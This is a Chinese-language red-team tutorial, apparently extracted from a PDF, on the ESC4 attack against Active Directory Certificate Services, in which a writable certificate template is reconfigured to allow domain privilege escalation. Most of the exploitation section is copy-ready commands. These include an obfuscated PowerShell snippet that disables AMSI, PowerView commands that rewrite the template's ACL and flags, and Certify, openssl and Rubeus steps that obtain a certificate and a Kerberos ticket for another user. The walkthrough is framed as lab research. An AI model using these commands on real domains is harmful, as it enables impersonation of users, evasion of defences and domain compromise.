针对域证书服务的攻击（4）- ESC4
0x00 前言
ESC4叫做“Vulnerable Certificate Template Access Control”，其实是弱ACL的证书模板会导致域提权。
写完ESC1-ESC3，ESC4由于白皮书没有比较详细的过程，并且我本地域环境出了点问题，就搁置到现
在。但是国庆的时候，看见国外的研究员发布了一篇关于ESC4的文章：https://github.com/daem0nc0
re/Abusing_Weak_ACL_on_Certificate_Templates，减少了我很多工作量。我们知道每个模板都有自己
的权限控制策略，ESC4利用的就是这个权限控制不严格，例如：domain users组的用户具有写入权
限，这样它就可以修改模板的配置为可以满足提权的配置样式，比如修改成ESC1的配置。言归正传，我
们还是先来搭建测试环境。
0x01 危害环境搭建
我们基于"基本EFS"配置ESC4的危害模板，修改模板名称为ESC4，其他配置如下：
开启CA证书管理程序批准
开启授权签名
配置Domain Users有可写权限（危害点）
其他保持默认
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-10-11
No. 1 / 9 - Welcome to www.red-team.cn
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-10-11
No. 2 / 9 - Welcome to www.red-team.cn
好了配置就这么简单，其实，重要的是domain users具有写入权限。其他的配置只是模仿常见情况。然
后记得发布证书模板。
0x02 利用
我还是使用Certify.exe 来发现危害：
Certify.exe find /vulnerable
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-10-11
No. 3 / 9 - Welcome to www.red-team.cn
我们主要利用的是domain users具有WriteDacl的权限，来修改模板的配置，让这个模板满足ESC1的要
求。
模板注册权限
我们现在只有模板的写入权限，没有模板的注册权限，我们来给模板加注册权限，我们使用powerview
来操作，直接加载powerview可能会被AMSI拦截：
这个难不倒我们，读过《bypass amsi的前世今生系列》的同学应该秒过，我们直接用一句话关闭
AMSI：
加注册权限：
$a="5492868772801748688168747280728187173688878280688776828"
$b="1173680867656877679866880867644817687416876797271"
$c=[string](0..37|%{[char][int](29+($a+$b).substring(($_*2),2))})-replace " "
$d=[Ref].Assembly.GetType($c)
$e=[string](38..51|%{[char][int](29+($a+$b).substring(($_*2),2))})-replace " "
$f=$d.GetField($e,'NonPublic,Static')
$f.SetValue($null,$true)
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-10-11
No. 4 / 9 - Welcome to www.red-team.cn
我们使用Certify.exe来验证下是否有注册权限：
禁用CA证书管理程序批准
虽然这个是我们人工配置开启的，是为了模拟常见情况，我们这会儿把这个配置关闭。同样使用
powerview：
Add-DomainObjectAcl -TargetIdentity ESC4 -PrincipalIdentity "Domain Users" -
RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase 
"LDAP://CN=Configuration,DC=redteamlab,DC=com" -Verbose
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key 
Services,CN=Services,CN=Configuration,DC=redteamlab,DC=com" -Identity ESC4 -XOR 
@{'mspki-enrollment-flag'=2} -Verbose
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-10-11
No. 5 / 9 - Welcome to www.red-team.cn
和前文中的图对比，选项中已经没有 PEND_ALL_REQUESTS 选项了。
禁用授权签名
我们把授权签名数设置为0，就可以达到禁用的效果：
启用在请求中提供使用者名称
阅读过ESC1-3的小伙伴应该知道这个配置的重要性，配置了这个配置，我们就可以将任何用户名指定为
SAN的值。
更改应用策略扩展
我们给应用策略扩展加上“客户端身份验证”，这样我们才能使用证书登录。
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key 
Services,CN=Services,CN=Configuration,DC=redteamlab,DC=com" -Identity ESC4 -Set 
@{'mspki-ra-signature'=0} -Verbose
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key 
Services,CN=Services,CN=Configuration,DC=redteamlab,DC=com" -Identity ESC4 -XOR 
@{'mspki-certificate-name-flag'=1} -Verbose
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key 
Services,CN=Services,CN=Configuration,DC=redteamlab,DC=com" -Identity ESC4 -Set 
@{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-10-11
No. 6 / 9 - Welcome to www.red-team.cn
这么一通操作下来，其实就是把ESC4改成了ESC1，核心是我们能够对模板有写入权限。接下来的操作就
是和ESC1的操作一样了，利用certify.exe搞TGT。
0x03 理解
在0x02 利用中，我们使用powerview直接修改了模板的很多属性，我们可以使用powerview来看下有哪
些属性：
这个配置，直接对应我们界面配置的相关选项，在这儿我直接借用https://github.com/daem0nc0re/Ab
using_Weak_ACL_on_Certificate_Templates的图。
Certify.exe request /ca:"win2019.redteamlab.com\redteamlab-WIN2019-CA-1" 
/template:ESC4 /altname:xiaoaiti
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic 
Provider v1.0" -export -out cert.pfx
Rubeus.exe asktgt /user:xiaoaiti /certificate:cert.pfx /ptt
Get-DomainObject -SearchBase "CN=Configuration,DC=redteamlab,DC=com" -LDAPFilter 
"(objectclass=pkicertificatetemplate)" -Identity ESC4
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-10-11
No. 7 / 9 - Welcome to www.red-team.cn
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-10-11
No. 8 / 9 - Welcome to www.red-team.cn
0x04 总结
ESC4真正的核心是权限控制的问题，让我们地权限用户可以修改模板，导致了我们可以把模板修改成可
以提权的样式，然后利用。
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-10-11
No. 9 / 9 - Welcome to www.red-team.cn